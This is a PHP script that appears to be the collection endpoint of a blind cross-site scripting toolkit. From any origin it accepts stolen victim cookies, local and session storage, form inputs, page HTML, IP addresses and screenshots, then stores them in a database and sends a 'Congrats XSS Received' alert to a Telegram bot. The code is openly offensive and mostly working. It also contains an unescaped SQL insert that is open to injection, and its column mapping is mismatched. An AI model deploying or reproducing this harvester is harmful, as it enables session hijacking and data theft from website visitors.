<?php

// Allow access from any origin
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: content-type");
// Optionally, you can specify allowed methods
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");

// Your code to handle GET data from other sources
$data = array("message" => "Data retrieved successfully.");

//Database Config
$servername = "localhost";
$username = "UserDB_xss";
$password = "PAS-DB";
$dbname = "DB-name_monitor";

//Telegram Bot Config
$token = "**********Bot_Token***************";
$chat_id = "****YourTelegramChatID";


date_default_timezone_set('Asia/Tehran');
$current_time = date('Y-m-d H:i:s');

$conn = new mysqli($servername, $username, $password, $dbname);

$data = json_decode(file_get_contents('php://input'), true);

$cookies = $data['cookies'];
$location = $data['location'];
$userAgent = $data['userAgent'];
$userip = $data['userip'];
$localData = $data['localData'];
$sessionData = $data['sessionData'];
$inputs = $data['inputs'];
$pageHTML = $data['pageHTML'];
$pageTitle = $data['pageTitle'];
$image_code = $data['image'];
$image_code = substr($image_code, 23);

// save Image screenshot
$time_name="";
$time_name=time().'-image.png';
$image = base64_decode($image_code);
$image_check = imageCreateFromString($image);
if (!$image_check) {
  die('Base64 value is not a valid image');
}
else
{
    echo "image OK!". "<br>";
}
$img_file = 'files/'.$time_name;
file_put_contents($img_file, $image);

// parsed data
echo "Cookies: " . htmlspecialchars($cookies) . "<br>";
echo "Location: " . htmlspecialchars($location) . "<br>";
echo "User Agent: " . htmlspecialchars($userAgent) . "<br>";
echo "User IP: " . htmlspecialchars($userip) . "<br>";
echo "Local Data: " . htmlspecialchars($localData) . "<br>";
echo "Session Data: " . htmlspecialchars($sessionData) . "<br>";
echo "Page HTML: " . htmlspecialchars($pageHTML) . "<br>";
echo "Page Title: " . htmlspecialchars($pageTitle) . "<br>";

// Save info in DataBase
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
else
{
    echo "Database OK!!". "<br>";
    $sql = "INSERT INTO xss (cookies, location, userAgent, userip, localData, sessionData, inputs, pageHTML, pageTitle, image, time) VALUES ('$cookies', '$location', '$userAgent', '$userip', '$localData', '$sessionData', '$inputs', '$location', '$pageTitle', '$time_name', '$img_file')";

    if ($conn->query($sql) === TRUE) {
      echo "New record created successfully". "<br>";
      $message = urlencode('ЁЯОп  Congrats *XSS Recived *' .
       "\n\n Title: $pageTitle".
      "\n image: [ScreenShot](https://YourSiteName.com/files/$time_name)".
            "\n Link: [Website]($location) \n");
      send_telegram_alert($message);
      
    } else {
      echo "Error: " . $sql . "<br>" . $conn->error. "<br>";
    }
    $conn->close();
    
}

// Telegram Send Function
function send_telegram_alert($mgsALRM) {
    global $token ;
    global $chat_id ;
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$mgsALRM&parse_mode=Markdown";
     $result = file_get_contents($url, false);
    if ($result === FALSE) {
        echo "MSG sended ERROR";
    }
    else 
    {
        echo "MSG sended to telegram.";
    }
    
        if ($result === True) {
            echo "Message sended to telegram.";
        }
    }


?>
